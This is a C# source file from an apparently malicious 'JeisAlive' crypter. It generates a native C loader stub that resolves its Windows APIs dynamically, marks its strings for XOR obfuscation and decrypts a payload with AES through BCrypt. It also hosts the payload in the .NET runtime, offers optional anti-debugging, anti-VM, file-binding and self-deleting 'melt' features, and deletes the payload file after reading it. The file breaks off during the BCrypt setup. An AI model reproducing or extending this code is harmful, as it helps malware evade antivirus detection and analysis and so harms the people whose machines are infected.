using System;
using System.Text;

namespace JeisAlive.Engine
{
    public class StubGeneratorConfig
    {
        public byte[] EncryptedBlob { get; set; } = Array.Empty<byte>();
        public byte[] Salt { get; set; } = Array.Empty<byte>();
        public bool AntiDebug { get; set; }
        public bool AntiVM { get; set; }
        public bool HasMelt { get; set; }
        public bool HasBoundFiles { get; set; }
        public bool SelfOverlay { get; set; }
    }

    public static class StubCodeGenerator
    {
        public static string Generate(StubGeneratorConfig config)
        {
            var sb = new StringBuilder(64 * 1024);

            EmitHeaders(sb);
            EmitWindowsTypes(sb);
            EmitFunctionPointerTypedefs(sb);
            EmitGlobals(sb);
            EmitEmbeddedData(sb, config);
            EmitApiResolver(sb);
            EmitBCryptDecrypt(sb);

            if (config.AntiDebug)
                EmitAntiDebug(sb);

            if (config.AntiVM)
                EmitAntiVM(sb);

            EmitTimingCheck(sb);

            EmitDecryptPayload(sb);
            EmitReadPayloadFromFile(sb);
            EmitClrHosting(sb);

            if (config.HasBoundFiles)
                EmitBoundFileLaunch(sb);

            if (config.HasMelt)
                EmitMelt(sb);

            EmitEntryPoint(sb, config);

            return sb.ToString();
        }

        private static void EmitHeaders(StringBuilder sb)
        {
            sb.AppendLine("/* JeisAlive native stub — no headers, fully self-contained */");
            sb.AppendLine();
            sb.AppendLine("/* ---- Standard C types (replacing stdint.h / stddef.h) ---- */");
            sb.AppendLine("typedef unsigned char      uint8_t;");
            sb.AppendLine("typedef unsigned short     uint16_t;");
            sb.AppendLine("typedef unsigned int       uint32_t;");
            sb.AppendLine("typedef unsigned long long uint64_t;");
            sb.AppendLine("typedef signed char        int8_t;");
            sb.AppendLine("typedef short              int16_t;");
            sb.AppendLine("typedef int                int32_t;");
            sb.AppendLine("typedef long long          int64_t;");
            sb.AppendLine("#ifdef _WIN64");
            sb.AppendLine("typedef long long          intptr_t;");
            sb.AppendLine("typedef unsigned long long uintptr_t;");
            sb.AppendLine("typedef unsigned long long size_t;");
            sb.AppendLine("#else");
            sb.AppendLine("typedef int                intptr_t;");
            sb.AppendLine("typedef unsigned int       uintptr_t;");
            sb.AppendLine("typedef unsigned int       size_t;");
            sb.AppendLine("#endif");
            sb.AppendLine("#define NULL ((void*)0)");
            sb.AppendLine();
            sb.AppendLine("/* ---- C string/memory functions (provided by MSVCRT, linked automatically) ---- */");
            sb.AppendLine("void* __cdecl memcpy(void*, const void*, size_t);");
            sb.AppendLine("void* __cdecl memset(void*, int, size_t);");
            sb.AppendLine("int   __cdecl memcmp(const void*, const void*, size_t);");
            sb.AppendLine("size_t __cdecl strlen(const char*);");
            sb.AppendLine("char* __cdecl strcat(char*, const char*);");
            sb.AppendLine("char* __cdecl strcpy(char*, const char*);");
            sb.AppendLine("int   __cdecl strcmp(const char*, const char*);");
            sb.AppendLine("char* __cdecl strncpy(char*, const char*, size_t);");
            sb.AppendLine();
        }

        private static void EmitWindowsTypes(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Windows types (no SDK headers for TCC) ---- */");
            sb.AppendLine("typedef void* HANDLE;");
            sb.AppendLine("typedef void* HMODULE;");
            sb.AppendLine("typedef void* HINSTANCE;");
            sb.AppendLine("typedef void* HWND;");
            sb.AppendLine("typedef void* HRESULT_PTR;");
            sb.AppendLine("typedef unsigned long DWORD;");
            sb.AppendLine("typedef long LONG;");
            sb.AppendLine("typedef long HRESULT;");
            sb.AppendLine("typedef int BOOL;");
            sb.AppendLine("typedef unsigned char BYTE;");
            sb.AppendLine("typedef unsigned short WORD;");
            sb.AppendLine("typedef char* LPSTR;");
            sb.AppendLine("typedef const char* LPCSTR;");
            sb.AppendLine("typedef unsigned short WCHAR;");
            sb.AppendLine("typedef WCHAR* LPWSTR;");
            sb.AppendLine("typedef const WCHAR* LPCWSTR;");
            sb.AppendLine("typedef void* LPVOID;");
            sb.AppendLine("typedef const void* LPCVOID;");
            sb.AppendLine("typedef size_t SIZE_T;");
            sb.AppendLine("typedef void* FARPROC;");
            sb.AppendLine("typedef unsigned int UINT;");
            sb.AppendLine("typedef DWORD* LPDWORD;");
            sb.AppendLine();
            sb.AppendLine("#define TRUE 1");
            sb.AppendLine("#define FALSE 0");
            sb.AppendLine("#define INVALID_HANDLE_VALUE ((HANDLE)(intptr_t)-1)");
            sb.AppendLine("#define MAX_PATH 260");
            sb.AppendLine("#define MAX_COMPUTERNAME_LENGTH 31");
            sb.AppendLine("#define SW_SHOW 5");
            sb.AppendLine("#define SW_HIDE 0");
            sb.AppendLine("#define FILE_ATTRIBUTE_NORMAL 0x80");
            sb.AppendLine("#define CREATE_ALWAYS 2");
            sb.AppendLine("#define GENERIC_WRITE 0x40000000");
            sb.AppendLine("#define GENERIC_READ 0x80000000");
            sb.AppendLine("#define MOVEFILE_REPLACE_EXISTING 1");
            sb.AppendLine("#define S_OK ((HRESULT)0)");
            sb.AppendLine("#define CREATE_NO_WINDOW 0x08000000");
            sb.AppendLine();
            sb.AppendLine("typedef struct { DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle;");
            sb.AppendLine("    DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;");
            sb.AppendLine("    DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute;");
            sb.AppendLine("    DWORD dwFlags; WORD wShowWindow; WORD cbReserved2;");
            sb.AppendLine("    BYTE* lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;");
            sb.AppendLine("} STARTUPINFOA;");
            sb.AppendLine();
            sb.AppendLine("typedef struct { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION;");
            sb.AppendLine();
            sb.AppendLine("typedef struct { DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; } SECURITY_ATTRIBUTES;");
            sb.AppendLine();
            sb.AppendLine("/* COM / CLR GUIDs */");
            sb.AppendLine("typedef struct { DWORD Data1; WORD Data2; WORD Data3; BYTE Data4[8]; } GUID;");
            sb.AppendLine("typedef GUID IID;");
            sb.AppendLine("typedef GUID CLSID;");
            sb.AppendLine();
        }

        private static void EmitFunctionPointerTypedefs(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Dynamically resolved API typedefs ---- */");
            sb.AppendLine("typedef HMODULE (__stdcall *__FN_type_GetModuleHandleA__)(LPCSTR);");
            sb.AppendLine("typedef FARPROC (__stdcall *__FN_type_GetProcAddress__)(HMODULE, LPCSTR);");
            sb.AppendLine("typedef HMODULE (__stdcall *__FN_type_LoadLibraryA__)(LPCSTR);");
            sb.AppendLine("typedef void    (__stdcall *__FN_type_ExitProcess__)(UINT);");
            sb.AppendLine("typedef HANDLE  (__stdcall *__FN_type_GetCurrentProcess__)(void);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_IsDebuggerPresent__)(void);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_CheckRemoteDebuggerPresent__)(HANDLE, BOOL*);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetTickCount__)(void);");
            sb.AppendLine("typedef void    (__stdcall *__FN_type_Sleep__)(DWORD);");
            sb.AppendLine("typedef void    (__stdcall *__FN_type_OutputDebugStringA__)(LPCSTR);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetLastError__)(void);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_GetComputerNameA__)(LPSTR, LPDWORD);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_GetUserNameA__)(LPSTR, LPDWORD);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_GetVolumeInformationA__)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);");
            sb.AppendLine("typedef LONG    (__stdcall *__FN_type_RegOpenKeyExA__)(HANDLE, LPCSTR, DWORD, DWORD, HANDLE*);");
            sb.AppendLine("typedef LONG    (__stdcall *__FN_type_RegQueryValueExA__)(HANDLE, LPCSTR, LPDWORD, LPDWORD, BYTE*, LPDWORD);");
            sb.AppendLine("typedef LONG    (__stdcall *__FN_type_RegCloseKey__)(HANDLE);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetTempPathA__)(DWORD, LPSTR);");
            sb.AppendLine("typedef HANDLE  (__stdcall *__FN_type_CreateFileA__)(LPCSTR, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_WriteFile__)(HANDLE, LPCVOID, DWORD, LPDWORD, void*);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_ReadFile__)(HANDLE, LPVOID, DWORD, DWORD*, void*);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetFileSize__)(HANDLE, DWORD*);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_CloseHandle__)(HANDLE);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_DeleteFileA__)(LPCSTR);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_MoveFileExA__)(LPCSTR, LPCSTR, DWORD);");
            sb.AppendLine("typedef HINSTANCE (__stdcall *__FN_type_ShellExecuteA__)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, int);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetModuleFileNameA__)(HMODULE, LPSTR, DWORD);");
            sb.AppendLine("typedef HRESULT (__stdcall *__FN_type_CLRCreateInstance__)(const CLSID*, const IID*, LPVOID*);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_SetFileAttributesA__)(LPCSTR, DWORD);");
            sb.AppendLine("typedef DWORD   (__stdcall *__FN_type_GetFileAttributesA__)(LPCSTR);");
            sb.AppendLine("typedef void    (__stdcall *__FN_type_GetSystemInfo__)(void*);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_GlobalMemoryStatusEx__)(void*);");
            sb.AppendLine("typedef UINT    (__stdcall *__FN_type_GetSystemDirectoryA__)(LPSTR, UINT);");
            sb.AppendLine("typedef LPVOID  (__stdcall *__FN_type_VirtualAlloc__)(LPVOID, SIZE_T, DWORD, DWORD);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_VirtualFree__)(LPVOID, SIZE_T, DWORD);");
            sb.AppendLine("typedef BOOL    (__stdcall *__FN_type_CreateProcessA__)(LPCSTR, LPSTR, void*, void*, BOOL, DWORD, LPVOID, LPCSTR, void*, void*);");
            sb.AppendLine();
        }

        private static void EmitGlobals(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Global function pointers ---- */");
            sb.AppendLine("static __FN_type_GetModuleHandleA__  __VAR_pGetModuleHandleA__;");
            sb.AppendLine("static __FN_type_GetProcAddress__    __VAR_pGetProcAddress__;");
            sb.AppendLine("static __FN_type_LoadLibraryA__      __VAR_pLoadLibraryA__;");
            sb.AppendLine("static __FN_type_ExitProcess__       __VAR_pExitProcess__;");
            sb.AppendLine("static __FN_type_GetCurrentProcess__ __VAR_pGetCurrentProcess__;");
            sb.AppendLine("static __FN_type_IsDebuggerPresent__ __VAR_pIsDebuggerPresent__;");
            sb.AppendLine("static __FN_type_CheckRemoteDebuggerPresent__ __VAR_pCheckRemoteDebuggerPresent__;");
            sb.AppendLine("static __FN_type_GetTickCount__      __VAR_pGetTickCount__;");
            sb.AppendLine("static __FN_type_Sleep__             __VAR_pSleep__;");
            sb.AppendLine("static __FN_type_OutputDebugStringA__ __VAR_pOutputDebugStringA__;");
            sb.AppendLine("static __FN_type_GetLastError__      __VAR_pGetLastError__;");
            sb.AppendLine("static __FN_type_GetComputerNameA__  __VAR_pGetComputerNameA__;");
            sb.AppendLine("static __FN_type_GetUserNameA__      __VAR_pGetUserNameA__;");
            sb.AppendLine("static __FN_type_GetVolumeInformationA__ __VAR_pGetVolumeInformationA__;");
            sb.AppendLine("static __FN_type_RegOpenKeyExA__     __VAR_pRegOpenKeyExA__;");
            sb.AppendLine("static __FN_type_RegQueryValueExA__  __VAR_pRegQueryValueExA__;");
            sb.AppendLine("static __FN_type_RegCloseKey__       __VAR_pRegCloseKey__;");
            sb.AppendLine("static __FN_type_GetTempPathA__      __VAR_pGetTempPathA__;");
            sb.AppendLine("static __FN_type_CreateFileA__       __VAR_pCreateFileA__;");
            sb.AppendLine("static __FN_type_WriteFile__         __VAR_pWriteFile__;");
            sb.AppendLine("static __FN_type_ReadFile__           __VAR_pReadFile__;");
            sb.AppendLine("static __FN_type_GetFileSize__       __VAR_pGetFileSize__;");
            sb.AppendLine("static __FN_type_CloseHandle__       __VAR_pCloseHandle__;");
            sb.AppendLine("static __FN_type_DeleteFileA__       __VAR_pDeleteFileA__;");
            sb.AppendLine("static __FN_type_VirtualAlloc__      __VAR_pVirtualAlloc__;");
            sb.AppendLine("static __FN_type_VirtualFree__       __VAR_pVirtualFree__;");
            sb.AppendLine("static __FN_type_MoveFileExA__       __VAR_pMoveFileExA__;");
            sb.AppendLine("static __FN_type_ShellExecuteA__     __VAR_pShellExecuteA__;");
            sb.AppendLine("static __FN_type_GetModuleFileNameA__ __VAR_pGetModuleFileNameA__;");
            sb.AppendLine("static __FN_type_CLRCreateInstance__ __VAR_pCLRCreateInstance__;");
            sb.AppendLine("static __FN_type_SetFileAttributesA__ __VAR_pSetFileAttributesA__;");
            sb.AppendLine("static __FN_type_GetFileAttributesA__ __VAR_pGetFileAttributesA__;");
            sb.AppendLine("static __FN_type_GetSystemInfo__     __VAR_pGetSystemInfo__;");
            sb.AppendLine("static __FN_type_GlobalMemoryStatusEx__ __VAR_pGlobalMemoryStatusEx__;");
            sb.AppendLine("static __FN_type_GetSystemDirectoryA__ __VAR_pGetSystemDirectoryA__;");
            sb.AppendLine("static __FN_type_CreateProcessA__    __VAR_pCreateProcessA__;");
            sb.AppendLine();
        }

        private static void EmitEmbeddedData(StringBuilder sb, StubGeneratorConfig config)
        {
            sb.AppendLine("/* ---- Payload is read from file (argv[1]), not embedded ---- */");
            sb.AppendLine("static unsigned char* __DATA_blob__ = NULL;");
            sb.AppendLine("static int __DATA_blob_len__ = 0;");

            if (config.Salt != null && config.Salt.Length > 0)
            {
                EmitByteArray(sb, "__DATA_salt__", config.Salt);
                sb.AppendLine($"static int __DATA_salt_len__ = {config.Salt.Length};");
            }
            else
            {
                sb.AppendLine("static unsigned char __DATA_salt__[] = { 0 };");
                sb.AppendLine("static int __DATA_salt_len__ = 0;");
            }

            sb.AppendLine();
        }

        private static void EmitReadPayloadFromFile(StringBuilder sb)
        {
            sb.AppendLine("static int __FN_read_payload_file__(const char* __VAR_path__) {");
            sb.AppendLine("    HANDLE __VAR_hFile__ = __VAR_pCreateFileA__(__VAR_path__, 0x80000000, 1, NULL, 3, 0, NULL);");
            sb.AppendLine("    if (__VAR_hFile__ == (HANDLE)-1) return 0;");
            sb.AppendLine("    DWORD __VAR_size_hi__ = 0;");
            sb.AppendLine("    DWORD __VAR_size_lo__ = __VAR_pGetFileSize__(__VAR_hFile__, &__VAR_size_hi__);");
            sb.AppendLine("    if (__VAR_size_lo__ == 0) { __VAR_pCloseHandle__(__VAR_hFile__); return 0; }");
            sb.AppendLine("    __DATA_blob__ = (unsigned char*)__VAR_pVirtualAlloc__(NULL, __VAR_size_lo__, 0x3000, 0x04);");
            sb.AppendLine("    if (!__DATA_blob__) { __VAR_pCloseHandle__(__VAR_hFile__); return 0; }");
            sb.AppendLine("    DWORD __VAR_read__ = 0;");
            sb.AppendLine("    __VAR_pReadFile__(__VAR_hFile__, __DATA_blob__, __VAR_size_lo__, &__VAR_read__, NULL);");
            sb.AppendLine("    __VAR_pCloseHandle__(__VAR_hFile__);");
            sb.AppendLine("    __DATA_blob_len__ = (int)__VAR_read__;");
            sb.AppendLine("    __VAR_pDeleteFileA__(__VAR_path__);");
            sb.AppendLine("    return __DATA_blob_len__ > 0;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitByteArray(StringBuilder sb, string name, byte[] data)
        {
            sb.Append($"static unsigned char {name}[] = {{");

            for (int i = 0; i < data.Length; i++)
            {
                if (i % 32 == 0)
                    sb.AppendLine().Append("    ");

                sb.Append($"0x{data[i]:X2}");
                if (i < data.Length - 1)
                    sb.Append(',');
            }

            sb.AppendLine().AppendLine("};");
        }

        private static void EmitApiResolver(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Dynamic API resolution ---- */");
            EmitStringPlaceholders(sb);
            sb.AppendLine();
            sb.AppendLine("__declspec(dllimport) HMODULE __stdcall GetModuleHandleA(LPCSTR);");
            sb.AppendLine("__declspec(dllimport) FARPROC __stdcall GetProcAddress(HMODULE, LPCSTR);");
            sb.AppendLine();
            sb.AppendLine("static void __FN_resolve_apis__(void) {");
            sb.AppendLine("    HMODULE __VAR_hK32__ = GetModuleHandleA(__STR_kernel32__);");
            sb.AppendLine("    __VAR_pGetModuleHandleA__ = (__FN_type_GetModuleHandleA__)GetProcAddress(__VAR_hK32__, __STR_GetModuleHandleA__);");
            sb.AppendLine("    __VAR_pGetProcAddress__ = (__FN_type_GetProcAddress__)GetProcAddress(__VAR_hK32__, __STR_GetProcAddress__);");
            sb.AppendLine("    __VAR_pLoadLibraryA__ = (__FN_type_LoadLibraryA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_LoadLibraryA__);");
            sb.AppendLine("    __VAR_pExitProcess__ = (__FN_type_ExitProcess__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_ExitProcess__);");
            sb.AppendLine("    __VAR_pGetCurrentProcess__ = (__FN_type_GetCurrentProcess__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetCurrentProcess__);");
            sb.AppendLine("    __VAR_pIsDebuggerPresent__ = (__FN_type_IsDebuggerPresent__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_IsDebuggerPresent__);");
            sb.AppendLine("    __VAR_pCheckRemoteDebuggerPresent__ = (__FN_type_CheckRemoteDebuggerPresent__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_CheckRemoteDebuggerPresent__);");
            sb.AppendLine("    __VAR_pGetTickCount__ = (__FN_type_GetTickCount__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetTickCount__);");
            sb.AppendLine("    __VAR_pSleep__ = (__FN_type_Sleep__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_Sleep__);");
            sb.AppendLine("    __VAR_pOutputDebugStringA__ = (__FN_type_OutputDebugStringA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_OutputDebugStringA__);");
            sb.AppendLine("    __VAR_pGetLastError__ = (__FN_type_GetLastError__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetLastError__);");
            sb.AppendLine("    __VAR_pGetComputerNameA__ = (__FN_type_GetComputerNameA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetComputerNameA__);");
            sb.AppendLine("    __VAR_pGetTempPathA__ = (__FN_type_GetTempPathA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetTempPathA__);");
            sb.AppendLine("    __VAR_pCreateFileA__ = (__FN_type_CreateFileA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_CreateFileA__);");
            sb.AppendLine("    __VAR_pReadFile__ = (__FN_type_ReadFile__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_ReadFile__);");
            sb.AppendLine("    __VAR_pGetFileSize__ = (__FN_type_GetFileSize__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetFileSize__);");
            sb.AppendLine("    __VAR_pWriteFile__ = (__FN_type_WriteFile__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_WriteFile__);");
            sb.AppendLine("    __VAR_pCloseHandle__ = (__FN_type_CloseHandle__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_CloseHandle__);");
            sb.AppendLine("    __VAR_pDeleteFileA__ = (__FN_type_DeleteFileA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_DeleteFileA__);");
            sb.AppendLine("    __VAR_pMoveFileExA__ = (__FN_type_MoveFileExA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_MoveFileExA__);");
            sb.AppendLine("    __VAR_pGetModuleFileNameA__ = (__FN_type_GetModuleFileNameA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetModuleFileNameA__);");
            sb.AppendLine("    __VAR_pSetFileAttributesA__ = (__FN_type_SetFileAttributesA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_SetFileAttributesA__);");
            sb.AppendLine("    __VAR_pGetFileAttributesA__ = (__FN_type_GetFileAttributesA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetFileAttributesA__);");
            sb.AppendLine("    __VAR_pGetSystemInfo__ = (__FN_type_GetSystemInfo__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetSystemInfo__);");
            sb.AppendLine("    __VAR_pGlobalMemoryStatusEx__ = (__FN_type_GlobalMemoryStatusEx__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GlobalMemoryStatusEx__);");
            sb.AppendLine("    __VAR_pGetSystemDirectoryA__ = (__FN_type_GetSystemDirectoryA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetSystemDirectoryA__);");
            sb.AppendLine("    __VAR_pVirtualAlloc__ = (__FN_type_VirtualAlloc__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_VirtualAlloc__);");
            sb.AppendLine("    __VAR_pVirtualFree__  = (__FN_type_VirtualFree__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_VirtualFree__);");
            sb.AppendLine("    __VAR_pCreateProcessA__ = (__FN_type_CreateProcessA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_CreateProcessA__);");
            sb.AppendLine();
            sb.AppendLine("    HMODULE __VAR_hAdvapi__ = __VAR_pLoadLibraryA__(__STR_advapi32__);");
            sb.AppendLine("    __VAR_pGetUserNameA__ = (__FN_type_GetUserNameA__)__VAR_pGetProcAddress__(__VAR_hAdvapi__, __STR_GetUserNameA__);");
            sb.AppendLine("    __VAR_pGetVolumeInformationA__ = (__FN_type_GetVolumeInformationA__)__VAR_pGetProcAddress__(__VAR_hK32__, __STR_GetVolumeInformationA__);");
            sb.AppendLine("    __VAR_pRegOpenKeyExA__ = (__FN_type_RegOpenKeyExA__)__VAR_pGetProcAddress__(__VAR_hAdvapi__, __STR_RegOpenKeyExA__);");
            sb.AppendLine("    __VAR_pRegQueryValueExA__ = (__FN_type_RegQueryValueExA__)__VAR_pGetProcAddress__(__VAR_hAdvapi__, __STR_RegQueryValueExA__);");
            sb.AppendLine("    __VAR_pRegCloseKey__ = (__FN_type_RegCloseKey__)__VAR_pGetProcAddress__(__VAR_hAdvapi__, __STR_RegCloseKey__);");
            sb.AppendLine();
            sb.AppendLine("    HMODULE __VAR_hShell__ = __VAR_pLoadLibraryA__(__STR_shell32__);");
            sb.AppendLine("    __VAR_pShellExecuteA__ = (__FN_type_ShellExecuteA__)__VAR_pGetProcAddress__(__VAR_hShell__, __STR_ShellExecuteA__);");
            sb.AppendLine();
            sb.AppendLine("    HMODULE __VAR_hMscoree__ = __VAR_pLoadLibraryA__(__STR_mscoree__);");
            sb.AppendLine("    if (__VAR_hMscoree__)");
            sb.AppendLine("        __VAR_pCLRCreateInstance__ = (__FN_type_CLRCreateInstance__)__VAR_pGetProcAddress__(__VAR_hMscoree__, __STR_CLRCreateInstance__);");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitStringPlaceholders(StringBuilder sb)
        {
            sb.AppendLine("/* ---- String literals (XOR-encrypted by PolymorphicTransforms) ---- */");
            sb.AppendLine("static char __STR_kernel32__[] = \"kernel32.dll\";");
            sb.AppendLine("static char __STR_advapi32__[] = \"advapi32.dll\";");
            sb.AppendLine("static char __STR_shell32__[]  = \"shell32.dll\";");
            sb.AppendLine("static char __STR_mscoree__[]  = \"mscoree.dll\";");
            sb.AppendLine("static char __STR_GetModuleHandleA__[] = \"GetModuleHandleA\";");
            sb.AppendLine("static char __STR_GetProcAddress__[]   = \"GetProcAddress\";");
            sb.AppendLine("static char __STR_LoadLibraryA__[]     = \"LoadLibraryA\";");
            sb.AppendLine("static char __STR_ExitProcess__[]      = \"ExitProcess\";");
            sb.AppendLine("static char __STR_GetCurrentProcess__[] = \"GetCurrentProcess\";");
            sb.AppendLine("static char __STR_IsDebuggerPresent__[] = \"IsDebuggerPresent\";");
            sb.AppendLine("static char __STR_CheckRemoteDebuggerPresent__[] = \"CheckRemoteDebuggerPresent\";");
            sb.AppendLine("static char __STR_GetTickCount__[]     = \"GetTickCount\";");
            sb.AppendLine("static char __STR_Sleep__[]            = \"Sleep\";");
            sb.AppendLine("static char __STR_OutputDebugStringA__[] = \"OutputDebugStringA\";");
            sb.AppendLine("static char __STR_GetLastError__[]     = \"GetLastError\";");
            sb.AppendLine("static char __STR_GetComputerNameA__[] = \"GetComputerNameA\";");
            sb.AppendLine("static char __STR_GetUserNameA__[]     = \"GetUserNameA\";");
            sb.AppendLine("static char __STR_GetVolumeInformationA__[] = \"GetVolumeInformationA\";");
            sb.AppendLine("static char __STR_RegOpenKeyExA__[]    = \"RegOpenKeyExA\";");
            sb.AppendLine("static char __STR_RegQueryValueExA__[] = \"RegQueryValueExA\";");
            sb.AppendLine("static char __STR_RegCloseKey__[]      = \"RegCloseKey\";");
            sb.AppendLine("static char __STR_GetTempPathA__[]     = \"GetTempPathA\";");
            sb.AppendLine("static char __STR_CreateFileA__[]      = \"CreateFileA\";");
            sb.AppendLine("static char __STR_ReadFile__[]         = \"ReadFile\";");
            sb.AppendLine("static char __STR_GetFileSize__[]      = \"GetFileSize\";");
            sb.AppendLine("static char __STR_WriteFile__[]        = \"WriteFile\";");
            sb.AppendLine("static char __STR_CloseHandle__[]      = \"CloseHandle\";");
            sb.AppendLine("static char __STR_DeleteFileA__[]      = \"DeleteFileA\";");
            sb.AppendLine("static char __STR_MoveFileExA__[]      = \"MoveFileExA\";");
            sb.AppendLine("static char __STR_ShellExecuteA__[]    = \"ShellExecuteA\";");
            sb.AppendLine("static char __STR_GetModuleFileNameA__[] = \"GetModuleFileNameA\";");
            sb.AppendLine("static char __STR_CLRCreateInstance__[] = \"CLRCreateInstance\";");
            sb.AppendLine("static char __STR_SetFileAttributesA__[] = \"SetFileAttributesA\";");
            sb.AppendLine("static char __STR_GetFileAttributesA__[] = \"GetFileAttributesA\";");
            sb.AppendLine("static char __STR_GetSystemInfo__[]    = \"GetSystemInfo\";");
            sb.AppendLine("static char __STR_GlobalMemoryStatusEx__[] = \"GlobalMemoryStatusEx\";");
            sb.AppendLine("static char __STR_GetSystemDirectoryA__[] = \"GetSystemDirectoryA\";");
            sb.AppendLine("static char __STR_VirtualAlloc__[] = \"VirtualAlloc\";");
            sb.AppendLine("static char __STR_VirtualFree__[]  = \"VirtualFree\";");
            sb.AppendLine("static char __STR_CreateProcessA__[] = \"CreateProcessA\";");
            sb.AppendLine("static char __STR_open__[]    = \"open\";");
            sb.AppendLine("static char __STR_v4__[]      = \"v4.0.30319\";");
            sb.AppendLine("static char __STR_regpath__[] = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\";");
            sb.AppendLine("static char __STR_prodid__[]  = \"ProductId\";");
            sb.AppendLine("static char __STR_rootc__[]   = \"C:\\\\\";");
            sb.AppendLine("static char __STR_dotdll__[]  = \".dll\";");
            sb.AppendLine("static char __STR_entrytype__[]  = \"JeisAlive.Loader.Entry\";");
            sb.AppendLine("static char __STR_entrymethod__[] = \"Run\";");
            sb.AppendLine("static char __STR_bcrypt__[] = \"bcrypt.dll\";");
            sb.AppendLine();
        }

        private static void EmitBCryptDecrypt(StringBuilder sb)
        {
            sb.AppendLine("/* ---- AES-CBC decryption via BCrypt ---- */");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptOpenAlgorithmProvider_t__)(void**, LPCWSTR, LPCWSTR, DWORD);");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptSetProperty_t__)(void*, LPCWSTR, BYTE*, DWORD, DWORD);");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptGenerateSymmetricKey_t__)(void*, void**, BYTE*, DWORD, BYTE*, DWORD, DWORD);");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptDecrypt_t__)(void*, BYTE*, DWORD, void*, BYTE*, DWORD, BYTE*, DWORD, DWORD*, DWORD);");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptDestroyKey_t__)(void*);");
            sb.AppendLine("typedef long __stdcall (*__FN_BCryptCloseAlgorithmProvider_t__)(void*, DWORD);");
            sb.AppendLine();
            sb.AppendLine("static __FN_BCryptOpenAlgorithmProvider_t__ __VAR_pBCryptOpenAlg__;");
            sb.AppendLine("static __FN_BCryptSetProperty_t__ __VAR_pBCryptSetProp__;");
            sb.AppendLine("static __FN_BCryptGenerateSymmetricKey_t__ __VAR_pBCryptGenKey__;");
            sb.AppendLine("static __FN_BCryptDecrypt_t__ __VAR_pBCryptDecrypt__;");
            sb.AppendLine("static __FN_BCryptDestroyKey_t__ __VAR_pBCryptDestroyKey__;");
            sb.AppendLine("static __FN_BCryptCloseAlgorithmProvider_t__ __VAR_pBCryptCloseAlg__;");
            sb.AppendLine();
            sb.AppendLine("static int __FN_init_bcrypt__(void) {");
            sb.AppendLine("    HMODULE __VAR_hBc__ = __VAR_pLoadLibraryA__(__STR_bcrypt__);");
            sb.AppendLine("    if (!__VAR_hBc__) return 0;");
            sb.AppendLine("    __VAR_pBCryptOpenAlg__ = (__FN_BCryptOpenAlgorithmProvider_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptOpenAlgorithmProvider\");");
